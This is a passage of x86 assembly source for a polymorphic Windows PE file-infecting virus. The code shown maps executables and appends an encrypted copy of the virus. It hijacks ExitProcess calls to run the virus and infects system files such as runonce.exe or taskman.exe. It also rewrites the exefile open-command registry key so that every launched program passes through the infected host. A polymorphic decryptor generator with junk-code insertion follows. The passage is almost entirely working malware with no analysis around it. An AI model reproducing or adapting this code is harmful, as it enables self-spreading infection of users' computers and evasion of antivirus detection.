                    jmp   CloseSetDateAttrib
            .ENDIF
            Call    trunc_file

            
            push   esi              ; esi == 0
            push   ecx                                          
            push   esi
            push   PAGE_READWRITE	
            push   esi
            push   dword ptr [ebp+hFile]
            lea    eax,[ebp+szCreateFileMappingA]
            call   K32Api

            test   eax,eax
            jz    ErrMap1
            mov    dword ptr [ebp +hMap],eax
            

            
            push   esi
            push   esi
            push   esi
            push   FILE_MAP_ALL_ACCESS             
            push   dword ptr [ebp+hMap]
            lea    eax,[ebp+szMapViewOfFile]
            call   K32Api
            test   eax,eax
            jz    ErrMap2
            
            mov    dword ptr [ebp +pMap],eax

            mov    edi,[eax+3ch]
            add    edi,eax


            mov    dword ptr [ebp + PEheader],edi
            push   dword ptr [edi].OptionalHeader.ImageBase
            pop    dword ptr [ebp + ImageBase]
            ;mov    eax, dword ptr [edi].OptionalHeader.SectionAlignment
            ;mov    dword ptr [ebp + SectionAlignment], eax

            movzx esi, word ptr [edi].FileHeader.SizeOfOptionalHeader
            lea esi, [[edi].OptionalHeader + esi]           ; esi pointe sur le premier IMAGE_SECTION_HEADER
            


            movzx eax, word ptr [[edi].FileHeader.NumberOfSections]
            dec   eax
            imul  eax,eax,sizeof IMAGE_SECTION_HEADER
           
            add   esi,eax  ; esi pointe sur le dernier IMAGE_SECTION_HEADER 
            
            assume esi:ptr IMAGE_SECTION_HEADER

            
            lea    ebx,[ebp + szExitProcess]
            lea    edx,[ebp + Kernel]
            Call   CheckFunctionImported
            mov    dword ptr [ebp + _Exit1],eax       
            lea    ebx,[ebp + exit]
            xor    edx,edx
            Call   CheckFunctionImported
            mov    dword ptr [ebp + _Exit2],eax  
            xor    edx,edx
            lea    ebx,[ebp + _exit]
            Call   CheckFunctionImported
            mov    dword ptr [ebp + _Exit3],eax

            cmp   dword ptr [ebp + _Exit1],0 
            jnz   PatchPlz
            cmp   dword ptr [ebp + _Exit2],0 
            jnz   PatchPlz 
            cmp   dword ptr [ebp + _Exit3],0 
            jnz   PatchPlz  

            jmp   CannotPatch
            
          PatchPlz:
            Call    PatchExitFunc
            or      eax,eax
            jnz     PatchOk

          CannotPatch:   
            Call    UnMap                      ; No Know Exit function, Resize File & quit...

            mov     ecx,dword ptr [ebp + OldSize]
            Call    trunc_file

            xor     edx,edx    
            pop     dword ptr fs:[edx]
            add     esp, 4

             ;db 0BCh
             ;_Inf_ESP3 dd 0 
             ;db 0BDh
             ;_Inf_EBP3 dd 0
            jmp     CloseSetDateAttrib
            
           PatchOk:  

            ;----
            Call   InitMemAccess    ; Get data section offset
            
            ;----
            or     [esi].Characteristics, 00000020h or 20000000h or 80000000h
            mov    eax, [[esi].PointerToRawData]
            or     eax,eax
            jz     ErrInf

            inc    byte ptr [ebp+InfectionCtr]

            add    eax,dword ptr [ebp + pMap]                   ;eax pointe sur le début de la derniere section
            add    eax,dword ptr [ebp + SizeRelative]         ;eax pointe sur la fin de la derniere section

            mov    edi, eax
            
            push   esi
            
            mov    dword ptr [ebp + FileOFFSET],edi    

            push   PAGE_EXECUTE_READWRITE
            push   MEM_RESERVE or MEM_COMMIT
            push   MAX_POLY_SIZE
            push   0
            lea    eax, dword ptr [ebp + szVirtualAlloc]
            Call   K32Api

            mov    dword ptr [ebp + pAlloc],eax
            
           @@:
            mov    edi, dword ptr [ebp + pAlloc]

            
            mov    ecx, CryptSize                       ; Size of the virus to encrypt
            lea    esi, [ebp+VirusStart]
            xor    edx,edx
            push   ebx
            Call   PolyMain
            pop    ebx

            cmp    dword ptr [ebp + PolyErrFlag], 1
            jz     @B                                   ; repair if a non-fatal error occured during polymorphism generation
            cmp    byte ptr [ebp + PolyMainErr], 0      ; rebuild all code if a fatal error occured
            jnz    @B


            
            
            mov    edi, dword ptr [ebp + FileOFFSET]
            push   ecx
            shr    ecx, 2
            inc    ecx
            
            rep    movsd                               ; Copy polymorphic virus to file 


            Call   UnMap
            pop    ecx
            mov    eax, dword ptr [ebp + OldSize]
            mov    dword ptr [ebp + OldSize], ecx
            add    eax, ecx
            add    eax, 1000;--------------------------------------------------

            
            mov    ecx,dword ptr [ebp + FAlignment]
            call    _Align
            mov    ecx,eax                 
           
            Call   trunc_file
            
            xor    esi, esi
            push   esi              ; esi == 0
            push   ecx                                          
            push   esi
            push   PAGE_READWRITE	
            push   esi
            push   dword ptr [ebp+hFile]
            lea    eax,[ebp+szCreateFileMappingA]
            call   K32Api

            test   eax,eax
            jz    ErrMap1
            mov    dword ptr [ebp +hMap],eax
            

            
            push   esi
            push   esi
            push   esi
            push   FILE_MAP_ALL_ACCESS             
            push   dword ptr [ebp+hMap]
            lea    eax,[ebp+szMapViewOfFile]
            call   K32Api
            test   eax,eax
            jz    ErrMap2
            
            mov    dword ptr [ebp +pMap],eax

            mov    edi,[eax+3ch]
            add    edi,eax
            mov    dword ptr [ebp + PEheader],edi
            movzx  esi, word ptr [edi].FileHeader.SizeOfOptionalHeader
            lea    esi, [[edi].OptionalHeader + esi]           ; esi pointe sur le premier IMAGE_SECTION_HEADER
            movzx  eax, word ptr [[edi].FileHeader.NumberOfSections]
            dec    eax
            imul   eax,eax,sizeof IMAGE_SECTION_HEADER
            add    esi,eax  ; esi pointe sur le dernier IMAGE_SECTION_HEADER 
            pop    eax
            
            mov    ecx, dword ptr [ebp + SizeRelative]
            add    ecx, dword ptr [ebp + OldSize]
            mov    [esi].SizeOfRawData,ecx
            mov    [esi].Misc.VirtualSize,ecx
            mov    edi, dword ptr [ebp + PEheader]
            mov    eax,[esi].SizeOfRawData
            add    eax,[esi].VirtualAddress
            mov    [edi].OptionalHeader.SizeOfImage,eax

            ;---
            push   MEM_DECOMMIT or MEM_RELEASE	
            push   MAX_POLY_SIZE
            push   dword ptr [ebp + pAlloc]
            lea    eax, dword ptr [ebp + szVirtualFree]
            Call   K32Api


            ;mov    edi, dword ptr [ebp + PEheader]
            mov    ecx, dword ptr [edi].OptionalHeader.CheckSum      ; Recalculate Checksum if needed
            jecxz  AfterCopy                ; Skip Checksum
            
            lea    eax, dword ptr [ebp + IMAGEHLP]
            push   eax
            lea    eax, dword ptr [ebp + szLoadLibraryA]
            Call   K32Api
            or     eax, eax
            jz     AfterCopy
            
            mov    ebx, eax

            lea    eax, dword ptr [ebp + szCheckSumMappedFile]
            push   eax
            push   ebx
            Call   dword ptr [ebp + _GetProcAddress] 

            or     eax, eax
            jz     FreeIMGHLP
            
            cmp    byte ptr [eax], 0CCh
            jz     ZeroShit
            
            push   eax
            xor    eax,eax
            push   eax
            push   dword ptr [ebp + hFile]
            lea    eax, dword ptr [ebp+szGetFileSize]
            call   K32Api
            pop    edx


            lea     ecx, dword ptr [edi].OptionalHeader.CheckSum
            push    ecx                     ; New Checksum
            Call    @F
            dd      ?                       ; Old Checksum         
           @@: 
            push   eax                      ; FileSize
            push   dword ptr [ebp + pMap]   ; MapAddr
            Call   edx                      ; Call CheckSumMappedFile

          FreeIMGHLP:
            push   ebx
            lea    eax, dword ptr [ebp + szFreeLibrary]
            Call   K32Api
            
            AfterCopy:

            
            ErrInf:



inf_main_handler:

      xor     edx,edx    
      pop     dword ptr fs:[edx]
      
     db 0BCh
     _Inf_ESP dd 0 
     db 0BDh
     _Inf_EBP dd 0

   
            and    byte ptr [ebp + _SizeTestFailed], 0    ; Clear error           
            
            push   dword ptr [ebp+pMap]
            lea    eax,dword ptr [ebp+szUnmapViewOfFile]
            call   K32Api
            
           ErrMap2:
            push   dword ptr [ebp+hMap]
            lea    eax, dword ptr [ebp+szCloseHandle]
            call   K32Api

            CloseSetDateAttrib:
            lea    eax,dword ptr [ebp + LastWriteTime]
            push   eax
            lea    eax,dword ptr [ebp + LastAccessTime]
            push   eax
            lea    eax,dword ptr [ebp + CreationTime]
            push   eax
            push   dword ptr [ebp+hFile]               
            lea    eax, dword ptr [ebp + szSetFileTime]
            Call   K32Api

           ErrMap1:


            push   dword ptr [ebp+hFile]
            lea    eax, dword ptr [ebp+szCloseHandle]
            call   K32Api
           ErrOpen:

            

            push   dword ptr [ebp + OriginalAttributes]
            push   dword ptr [ebp + pFileName]
            lea    eax, dword ptr [ebp + szSetFileAttributesA]
            Call   K32Api
                        
            ;assume edi:nothing
            ;assume esi:nothing

            push    dword ptr [ebp + InfEvent]
            lea     eax, dword ptr [ebp + szSetEvent]  ; We did the job
            Call    K32Api
            
            cmp    byte ptr [ebp + _SizeTestFailed], 0
            jnz    Infect2nd





            popad
            ret
    infect  endp    


_MainHostFile db 0
_MainHostFileName dd 0

CheckInfectionTimeOutThread:

            db      0BDh
ThreadDelta dd      00000000h


            push    3000                               ; TimeOut
            push    dword ptr [ebp + InfEvent]
            lea     eax, dword ptr [ebp + szWaitForSingleObject]
            Call    K32Api

            
            .IF     eax == WAIT_TIMEOUT                 ; infection hanged
                    .IF  byte ptr [ebp + _MainHostFile] == 1
                    
                         Call ReDoMainHost

                    .ELSE
                          xor  eax, eax
                          dec  dword ptr [eax]                ; Make fault then clear Mem and quit
                    .ENDIF
            .ENDIF

            push    dword ptr [ebp + InfEvent]
            lea     eax, dword ptr [ebp + szCloseHandle]
            Call    K32Api       
            
            push    eax
            lea     eax, dword ptr [ebp + szExitThread]
            Call    K32Api
            ret

ReDoMainHost:
            Call   UnMap
            
            push   dword ptr [ebp+hFile] 
            lea    eax, dword ptr [ebp + szCloseHandle]
            Call   K32Api
            
            push    dword ptr [ebp + _MainHostFileName]
            lea     eax, dword ptr [ebp + szDeleteFileA]
            Call    K32Api
            Call    SetupRegHook
            ret
                          
InfEvent                      dd 0
CheckInfectionTimeOutThreadID dd 0

NTTargetFile   db  "taskman.exe",0
W9xTargetFile  db  "runonce.exe",0

CompNameSize dd MAX_COMPUTERNAME_LENGTH + 1
LenWinDirStr    dd  0
szKeyName     db  'exefile\shell\open\command',0
szRegHook     db  ' "%1" %*',0
Disp          dd    0
pKey          dd    0
WinVer        dd    0

;REGHOOK
;-------------------------------------------- install reg HOOK Procedures ---------------------------
SetupRegHook   proc

      sub    esp, 800h                 ; get some mem
      mov    eax, esp
      push   0FFh                       ; Dir size
      push   eax                        ; buffer
      lea    eax, dword ptr [ebp + szGetSystemDirectoryA]
      Call   K32Api

      
      mov    edi, esp
      xor    ecx, ecx
     ReachNull:
      inc    ecx
      inc    edi
      cmp    byte ptr [edi], 0          ; 
      jnz    ReachNull

      mov    dword ptr [ebp + LenWinDirStr], ecx
      
      mov    byte ptr [edi], '\'
      inc    edi
      .IF    dword ptr [ebp + WinVer] ==  VER_PLATFORM_WIN32_NT 
             lea    esi, dword ptr [ebp + NTTargetFile]
      .ELSE
             lea    esi, dword ptr [ebp + W9xTargetFile]
      .ENDIF
      
     @@:
      lodsb
      stosb
      or     al,al
      jnz    @B

      
      mov    edi, esp                                ; eax pointer to %systemroot%\target.exe
      mov    esi, edi
      add    esi, 0FFh
      push   esi
      push   edi
      lea    eax, dword ptr [ebp + szFindFirstFileA]
      Call   K32Api
      
      push   eax
      push   eax
      lea    eax, dword ptr [ebp + szFindClose]
      Call   K32Api
      pop    eax
      
      inc    eax
      jnz    @F                         ; not in this dir?
      mov    edi, esp
      push   0FFh                       ; Dir size
      push   edi                        ; buffer
      lea    eax, dword ptr [ebp + szGetWindowsDirectoryA]
      Call   K32Api
      xor    ecx, ecx
      jmp    ReachNull
     @@:





      
      mov    ebx, esi
      add    ebx, SIZEOF WIN32_FIND_DATA



      .IF    dword ptr [ebp + WinVer]     ==  VER_PLATFORM_WIN32_NT  ; infect a copy of rundll on NT because SFC...

            mov    dword ptr [ebp + CompNameSize], MAX_COMPUTERNAME_LENGTH + 1
            lea    eax, dword ptr [ebp + CompNameSize]
            push   eax
            push   ebx
            lea    eax, dword ptr [ebp + szGetComputerNameA]
            Call   K32Api

            push    ebx
            mov     eax, ebx
            xor     ecx, ecx
           invert:
            mov     dl,  byte ptr [eax+ecx]
             
            .IF     dl  == 0
                    jmp  CopyNow
            .ELSEIF dl >= 41h && dl <= 5Ah
                    sub  dl, 41h
                    mov  bl, 25
                    sub  bl, dl
                    mov  dl, 41h
                    add  dl, bl

            .ELSEIF dl >= 61h && dl <= 7Ah
                    sub  dl, 61h
                    mov  bl, 25
                    sub  bl, dl
                    mov  dl, 61h
                    add  dl, bl

            .ENDIF
            
            mov     byte ptr [eax+ecx], dl
            inc     ecx
            jmp     invert
            
          CopyNow:
            pop    ebx
            mov    esi, esp
            mov    edi, ebx
            add    edi, MAX_COMPUTERNAME_LENGTH + 1
            push   edi
            mov    ecx, dword ptr [ebp + LenWinDirStr]
            rep    movsb
            mov    byte ptr [edi], '\'
            inc    edi
            mov    esi, ebx
           @@:
            lodsb
            stosb
            or     al,al
            jnz    @B
            pop    edi
            mov    eax, edi
            mov    edi, esp

            
            push   eax
            push   1                                        
            push   eax
            push   edi
            lea    eax, dword ptr [ebp + szCopyFileA]       ; Copy the file
            Call   K32Api                                ; 
            pop    eax          ; WinNt, 2000, XP : infect copy

      .ELSE                     ; Win9x infect directly rundll32.exe
      

            mov     eax, esp    ; infect original file
            
      .ENDIF         

      push   eax                ; eax can be either a pointer to the full path of
                                ; runonce.exe (win9x) or a pointer to a "reversed" computername exe path (NT)
                                


      mov    dword ptr [ebp + _MainHostFileName], eax


      mov    byte ptr [ebp + _MainHostFile], 1
      Call   infect                  ; infect it ! (Wont infect if we are running from it)
      mov    byte ptr [ebp + _MainHostFile], 0
      pop    edi
                    
      assume ebx : nothing
   

           
      lea     eax, dword ptr [ebp + Disp]
      push    eax
      lea     eax, dword ptr [ebp + pKey]
      push    eax
      xor     eax, eax
      push    eax
      push    KEY_ALL_ACCESS
      push    REG_OPTION_NON_VOLATILE         
      push    eax
      push    eax
      lea     eax, dword ptr [ebp + szKeyName]
      push    eax
      push    HKEY_CLASSES_ROOT
      lea     eax, dword ptr [ebp + szRegCreateKeyExA]
      Call    ADVAPI32Api

      lea     esi, dword ptr [ebp + szRegHook]
      mov     eax, edi
      call    _strlen
      push    edi
      add     edi, eax
      mov     ecx, eax
     @@:
      lodsb
      stosb
      inc     ecx
      or      al,al
      jnz     @B
      pop     edi

      
      push    ecx                                   ; <- size of hookstring
      push    edi                                   ; hookstring
      push    REG_SZ
      xor     eax, eax
      push    eax
      push    eax
      push    dword ptr [ebp + pKey]
      lea     eax, dword ptr [ebp + szRegSetValueExA]
      Call    ADVAPI32Api    

      push    dword ptr [ebp + pKey]
      lea     eax, dword ptr [ebp + szRegCloseKey]
      Call    ADVAPI32Api 
            

      add    esp, 800h 
      ret


SetupRegHook    endp






   




;
;
;in: esi = pFileMap
;in: edi = RVA
;
;out: eax = File offset
;

     RVAToOffset PROC uses edi esi ecx  
      
         assume esi:ptr IMAGE_DOS_HEADER 
         add esi,[esi].e_lfanew 
         assume esi:ptr IMAGE_NT_HEADERS 
       
         mov edx,esi 
         add edx,sizeof IMAGE_NT_HEADERS 
 
         movzx ecx,[esi].FileHeader.NumberOfSections 
         assume edx:ptr IMAGE_SECTION_HEADER 
         .while ecx>0 ; check all sections 
           .if edi>=[edx].VirtualAddress 
             mov eax,[edx].VirtualAddress 
             add eax,[edx].SizeOfRawData 
             .if edi<eax ; The address is in this section 
               mov dword ptr [ebp + SecHeader],edx              ; save section where we found the address

               sub edi, [edx].VirtualAddress
               mov eax,[edx].PointerToRawData 
               add eax,edi ; eax == file offset 
               ret 
             .endif 
           .endif 
           add edx,sizeof IMAGE_SECTION_HEADER 
           dec ecx                      ; next section
         .endw 
         ;assume edx:nothing 
         assume esi:nothing 
         mov eax,edi 
         ret 
         
     RVAToOffset endp 


CheckFunctionImported proc
    
            push   esi
            push   edi
            mov   edi,dword ptr [ebp + PEheader]
            mov   edi, [edi].OptionalHeader.DataDirectory[sizeof IMAGE_DATA_DIRECTORY].VirtualAddress 
            mov   esi,dword ptr [ebp + pMap]
            push  edx
            Call  RVAToOffset
            pop   edx
            add   eax,dword ptr [ebp + pMap]
            mov    edi,eax
            assume edi:ptr IMAGE_IMPORT_DESCRIPTOR 


                .while !([edi].OriginalFirstThunk==0 && [edi].TimeDateStamp==0 \
                               && [edi].ForwarderChain==0 && [edi].Name1==0 \
                               && [edi].FirstThunk==0)


                            or    edx,edx
                            jz    ModScan

                            push  edi
                            push  esi
                            mov   edi,[edi].Name1
                            mov   esi,dword ptr [ebp + pMap]
                            push  edx
                            Call  RVAToOffset
                            pop   edx
                            add   eax, dword ptr [ebp + pMap]
                            pop   esi
                            pop   edi

                            Call  _ToLower

                            push   edi
                            push   esi
                            mov    esi,edx 
                            mov    edi,eax
                            Call   _strlen
                            mov    ecx,eax
                            repz   cmpsb                ; Compare Modules
                            pop    esi
                            pop    edi
                            
                            or     ecx,ecx
                            jnz    NextModule
                         ModScan:
                            and    dword ptr [ebp + ThunkIndex],0



                    .if [edi].OriginalFirstThunk==0 
                        mov esi,[edi].FirstThunk 
                    .else 
                         mov esi,[edi].OriginalFirstThunk 
                    .endif

                            push  edi
                            mov   edi,esi
                            mov   esi,dword ptr [ebp + pMap]
                            push  edx
                            Call  RVAToOffset
                            pop   edx
                            pop   edi
                            add   eax, dword ptr [ebp + pMap]
                            mov   esi,eax 



            
                       .while dword ptr [esi] != 0

                            test dword ptr [esi],IMAGE_ORDINAL_FLAG32 
                            jnz  NotExitProcess
                                                        
                            push  edi
                            push  esi
                            mov   edi,[esi]
                            mov   esi,dword ptr [ebp + pMap]
                            push  edx
                            Call  RVAToOffset
                            pop   edx
                            add   eax, dword ptr [ebp + pMap]
                            pop   esi
                            pop   edi


                            
                            assume eax : ptr IMAGE_IMPORT_BY_NAME 

                            push  edi
                            push  esi
                            
                            push  eax
                            lea   eax,[eax].Name1
                            
                            Call  _strlen
                            mov   ecx,eax
                            pop   eax
                            lea   edi,[eax].Name1
                            mov   esi,ebx      
                            repz  cmpsb
                            pop   esi
                            pop   edi
                                   
                            or    ecx,ecx
                            jnz   NotExitProcess

                            
                            mov eax, dword ptr [edi].FirstThunk
                            add eax, dword ptr [ebp + ThunkIndex]
                            add eax, dword ptr [ebp + ImageBase]    ; eax = thunk to available exitfunc
                            
                            jmp   ExitFound
                            

                                               
                     NotExitProcess:
                     add  dword ptr [ebp + ThunkIndex],4
                     add  esi,4
                     .endw
                     NextModule:
                     add edi,sizeof IMAGE_IMPORT_DESCRIPTOR             
                 .endw

            xor    eax,eax
            ExitFound:
            pop    edi
            pop    esi

            ret
            
    CheckFunctionImported endp

    Int3InsideCodeOffset    dd  0


PatchExitFunc   proc
            pushad
            and     dword ptr [ebp + Int3InsideCodeOffset], 0




            
            assume    esi : ptr IMAGE_SECTION_HEADER 
            assume    edi: ptr IMAGE_NT_HEADERS


            push      dword ptr [[edi].OptionalHeader.ImageBase]
            pop       dword ptr [ebp + HostBase]
            
            movzx esi, word ptr [[edi].FileHeader.SizeOfOptionalHeader]
            lea esi, [[edi].OptionalHeader + esi]           ; esi pointe sur le premier IMAGE_SECTION_HEADER*



            mov    edx,esi
            assume edx : ptr IMAGE_SECTION_HEADER            
            mov    eax,[esi].PointerToRawData
            mov    ebx,dword ptr [ebp + pMap]           
            lea    esi, [ebx  + eax]  
            push   esi
            mov    ecx,[edx].Misc.VirtualSize
            
            cmp    dword ptr [edx],'0XPU'           ; Can't infect UPX
            jz     ExitScan

            push   esi
            push   ecx
SearchCavity: 

            lodsd
		cmp    eax, 0CCCCCCCCh
            jz     Int3InsideCode?                  ; int 3 for our jmp/call ?
NextCavity: jecxz  @Restore
            sub    ecx, 4
            jns    SearchCavity
   @Restore: 
            pop    ecx
            pop    esi
            
SearchCall: push   ecx
            
            lodsb

		 cmp    al,0FFh	              
		 jz     Call_op?

NextCall:   pop     ecx
            dec    ecx
            jnz    SearchCall    

ExitScan:                

            pop    esi

            popad
            mov    eax, dword ptr [ebp + Patched?]
            ret 
            
Int3InsideCode?:
            cmp    byte ptr [esi], 0CCh
            jnz    @F
            sub    esi, 4
            mov    dword ptr [ebp + Int3InsideCodeOffset], esi
            xor    ecx, ecx
           @@:
            jmp    NextCavity
 Call_op?:

            cmp    byte ptr [esi],15h
            jz     CheckExitProcess

            cmp    byte ptr [esi],25h
            jnz    NextCall   
        CheckExitProcess:

            mov    eax,dword ptr [esi+1]        ; ImageBase + FirstThunk+ThunkIndex

            cmp     dword ptr [ebp + _Exit1],eax
            jz      GOT1
            cmp     dword ptr [ebp + _Exit2],eax
            jz      GOT1
            cmp     dword ptr [ebp + _Exit3],eax
            jz      GOT1
            
        
            jmp     NextCall
           GOT1:
            or      eax,eax
            jz      NextCall


            Call    ApplyPatch

            jmp     NextCall




    PatchExitFunc   endp  
 

    ApplyPatch      proc uses esi

            push      esi


            mov       edi,dword ptr [ebp+PEheader]      ; goto PEhdr
            
  
                
            assume  edi:ptr IMAGE_NT_HEADERS
            movzx esi, word ptr [[edi].FileHeader.SizeOfOptionalHeader]
            lea esi, [[edi].OptionalHeader + esi]           ; esi pointe sur le premier IMAGE_SECTION_HEADER

            
            movzx  eax, word ptr [edi].FileHeader.NumberOfSections
            dec    eax
            imul   eax,eax,28h
            add    esi,eax

                        
            mov    eax,dword ptr [ebp + Size2Align]
            add    eax,[esi].VirtualAddress
            sub    eax,dword ptr [esi].PointerToRawData
            add    eax,dword ptr [edi].OptionalHeader.ImageBase     ; eax = VirusOffset VA



            mov     dword ptr [ebp + Patched?],1
            pop     esi
            
            mov     ecx, dword ptr [ebp + Int3InsideCodeOffset]
            
            .IF     ecx  == 0
                    mov     byte ptr [esi-1],68h
                    mov     dword ptr [esi],eax                            ; Patch !!!
                    mov     byte ptr [esi+4],0C3h
            .ELSE
                    push    eax
                    mov     dword ptr [ecx], eax
                    sub     ecx, dword ptr [ebp + pMap]
                    push    esi
                    movzx   esi, word ptr [[edi].FileHeader.SizeOfOptionalHeader]
                    lea     esi, [[edi].OptionalHeader + esi]  
                    add     ecx, [esi].VirtualAddress
                    sub     ecx, [esi].PointerToRawData
                    add     ecx, dword ptr [ebp + HostBase]
                    pop     esi
                    mov     dword ptr [esi+1], ecx                           ; Patch !!!
                    mov     ecx, dword ptr [ebp + Int3InsideCodeOffset]
                    mov     esi, ecx
                   @@:
                    dec     esi
                    call    Random32
                    cmp     byte ptr [esi], 0CCh
                    jnz     @F
                    mov     byte ptr [esi], al
                    jmp     @B
                   @@:
                    mov     esi, ecx
                    add     esi, 3
                   @@:
                    inc     esi
                    call    Random32
                    cmp     byte ptr [esi], 0CCh
                    jnz     @F
                    mov     byte ptr [esi], al
                    jmp     @B
                   @@:
                    pop     eax     
            .ENDIF
            
            sub     eax, OFFSET VirusStart         
            mov     dword ptr [ebp + @Delta],eax                    ; Pre-computed delta offset


            ret
    ApplyPatch      endp 
    UnMap   proc

            push   dword ptr [ebp+pMap]
            lea    eax,dword ptr [ebp+szUnmapViewOfFile]          ; UnMAP
            call   K32Api

            push   dword ptr [ebp+hMap]
            lea    eax, dword ptr [ebp+szCloseHandle]
            call   K32Api
            
            ret
    UnMap   endp



    trunc_file proc
       
            push   ecx
                   
            xor    esi,esi
            push   esi
            push   esi
            push   ecx
            push   dword ptr [ebp + hFile]
            lea    eax, dword ptr [ebp+szSetFilePointer]
            Call   K32Api
            
            push   dword ptr [ebp + hFile]
            lea    eax, dword ptr [ebp+szSetEndOfFile]
            Call   K32Api
              
            pop    ecx
            ret

    trunc_file endp
       
    _Align   proc
    
            push    edx
            xor     edx,edx
            push    eax
            div     ecx
            pop     eax
            sub     ecx,edx
            add     eax,ecx
            pop     edx
            ret
    _Align   endp

    _strlen  proc

            
             push  ecx 
             xor   ecx,ecx
             @@:
             inc   ecx
             cmp   byte ptr [eax + ecx],0
             jnz   @b
             mov   eax,ecx
             pop   ecx
             ret
   
   _strlen  endp
   

   _ToLower proc


             push esi
             push ecx
             mov  esi,eax
             Call _strlen
             mov  ecx,eax
             
             
           @NextCh:
             mov  al,byte ptr [esi+ecx]
             cmp  al,41h
             jb   @F
             cmp  al,5Ah
             ja   @F
             add  al,32
             mov  byte ptr [esi+ecx],al             
           @@:
             dec  ecx
             jns  @NextCh

             mov  eax,esi
             pop  ecx
             pop  esi
             
             ret
   _ToLower endp
   


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; POLY VARS



@Delta      dd      0
PolyBuf     dd      0
PolySize    dd      0

JmpShort?   db      0
PolyMainErr db      0
FileOFFSET  dd      0

What2encrypt dd     0
SizeOfWhat2encrypt dd   0
;RVA_What2encrypt    dd  0

base_reg    db      0       ; CRYPTOR REGS
key_reg     db      1       ;
counter_reg db      2       ;
cypher_reg  db      7       ;
garb_reg1   db      3       ; GARBAGE
garb_reg2   db      5       ;
garb_reg3   db      6       ;
dummy        db      0


;Key         dd      0       ; Cryptor Key Stored
BaseOFS     dd      0       ; Base Offset for later relocation
LoopOFS     dd      0       ; Begin of Offset to jump (decryption)    
CryptorPatch dd     0       ;
;JunkDataSize dd     0

;pBranchBuf  dd      0
;BranchCodeSize  dd      0

REG_EAX     dd      0       ; Registers to restore when exception occurs 
REG_ECX     dd      0
REG_EDX     dd      0
REG_EBX     dd      0
REG_ESI     dd      0
REG_EDI     dd      0
;REG_ESP     dd      0




PolyMain    proc

      mov   dword ptr [ebp + PolyBuf], edi

      mov   dword ptr [ebp + What2encrypt], esi
      mov   dword ptr [ebp + SizeOfWhat2encrypt], ecx
      and   byte ptr [ebp + WtLp_Called], 0
      and   word ptr [ebp + _garb1_reserved], 0
      mov   byte ptr [ebp + PolyMainErr], 1             ; init error
      
      ;---
       lea     eax,[PolyMain_handlder+ebp]                ; Setup SEH frame for poly error handling
       push    eax        
       mov     dword ptr [ebp + PolyMainDelta],ebp       ; Save Delta 
       mov     dword ptr [ebp + PolyMainStack],esp      ; Save Stack
       xor     edx,edx                         
       push    dword ptr fs:[edx]            
       mov     dword ptr fs:[edx],esp


      Call  PolyCryptor                         ; Create PolyCryptor

      mov   eax,edi
      sub   edi, dword ptr [ebp + PolyBuf]      ; Get size of generated PolyCryptor
      mov   dword ptr [ebp + PolySize],edi
      mov    edx,edi
      push   edx
      push   edi
      Call   EncryptVirus                      ; Call Polymorphic Encryption Routine
      pop    ecx
      pop    edx
      mov   eax,dword ptr [ebp + BaseOFS]
      add   dword ptr [eax],edi                 ; adjust base offset

      dec   byte ptr [ebp + PolyMainErr]        ; if we are here no fatal-error occured
      ;---
    PolyMain_handlder:
      db      0BCh
    PolyMainStack   dd      00000000h                 ; Restore Stack
      xor     eax,eax    
      pop     dword ptr fs:[eax] 
      db      0BDh
    PolyMainDelta dd 00000000h                         ; Restore Delta

      ;---     

      add   ecx, dword ptr [ebp + SizeOfWhat2encrypt]   ; return ecx == size of generated polycode
      mov   esi, dword ptr [ebp + PolyBuf]
      mov   eax, dword ptr [ebp + PolyErrFlag]
      ret
PolyMain    endp


PolyCryptor proc
   
        
        Call   GetRegs          ; Get Cryptor Regs


        ;Call   InitMemAccess    ; Get data section offset
        ;Call   GetRandomDataOFS ; init defaut mem aera


        ;Call   GetRandomDataOFS
        ;mov    cl, byte ptr [ebp + garb_reg3]
        ;mov    byte ptr [ebp + _REG_OPCODE], cl
        ;Call   EncodeMemLocation
        ;CALL   GEN_LEA_REG32_DISP32

        Call   Make_Random_Blk;-**-

        
        Call   SetSeq           ; First 3 decryptor instructions can have 6 different sequence


        Call   Random32
        jp     CRYPT_GEN_MOV_REG32_MEM_REG32
        
        mov    cl,byte ptr [ebp + base_reg]       
        Call   GEN_PUSH_REGMEM32 

        Call   Make_Random_Blk;-**-

        mov    cl,byte ptr [ebp + cypher_reg]     
        Call   GEN_POP_REG32
        Call   Make_Random_Blk;-**-
        jmp    @F
        
    CRYPT_GEN_MOV_REG32_MEM_REG32:       
        mov    ch,byte ptr [ebp + base_reg]
        mov    cl,byte ptr [ebp + cypher_reg]
        Call   GEN_MOV_REG32_MEM_REG32
        Call   Make_Random_Blk;-**-
        ;****
    @@:
        ;***
        Call   CryptSeq         ;
        
        Call   Make_Random_Blk;-**-

        Call   Random32
        jp     CRYPT_GEN_MOV_MEM_REG32_REG32

        mov    cl,byte ptr [ebp + cypher_reg]       
        Call   GEN_PUSH_REG32 
        
        Call   Make_Random_Blk;-**-
        
        mov    cl,byte ptr [ebp + base_reg]
        Call   GEN_POP_REGMEM32
        Call   Make_Random_Blk;-**-
        jmp    @F
   CRYPT_GEN_MOV_MEM_REG32_REG32:
      
        mov    ch,byte ptr [ebp + base_reg]
        mov    cl,byte ptr [ebp + cypher_reg]
        Call   GEN_MOV_MEM_REG32_REG32  
        Call   Make_Random_Blk;-**-
        
   @@:

        
        push    4                                   ; ADD REG32,4
        pop     ebx
        .IF    byte ptr [ebp + CryptBackward] != 0
                neg ebx                                 ; ADD REG32,-4
        .ENDIF
        ;-------------------------------------------------------------     
        Call   HideConst                                ; Hide it
        ;------------------------------------------------------------- 
        
        Call   Make_Random_Blk;-**-
                            ; ebx is now hidden
        ;***
        Call   Random32
        jp     GOFORADD
        
        neg    ebx
        mov    cl,byte ptr [ebp + base_reg]
        Call   GEN_SUB_REG32_IMM
        Call   Make_Random_Blk;-**-
        
        jmp    @F
   GOFORADD:
        mov    cl,byte ptr [ebp + base_reg]
        Call   GEN_ADD_REG32_IMM
        Call   Make_Random_Blk;-**-
      @@:
        ;------------------------------------------------------------- 
        mov    cl,byte ptr [ebp + base_reg]
        Call   RestConst 
        ;-------------------------------------------------------------
        Call   Make_Random_Blk;-**-

        call   Random32
        jp     @F
        ;mov    byte ptr [ebp + UseDec], 1
        mov    cl,byte ptr [ebp + counter_reg]
        CAll   GEN_DEC_REG32
        jmp    @MakeJMP
       @@:
        ;mov    byte ptr [ebp + UseDec], 0
        xor    ebx,ebx                                    
        dec    ebx
        ;-------------------------------------------------------------     
        Call   HideConst 
        ;------------------------------------------------------------- 
        
        Call   Make_Random_Blk;-**-
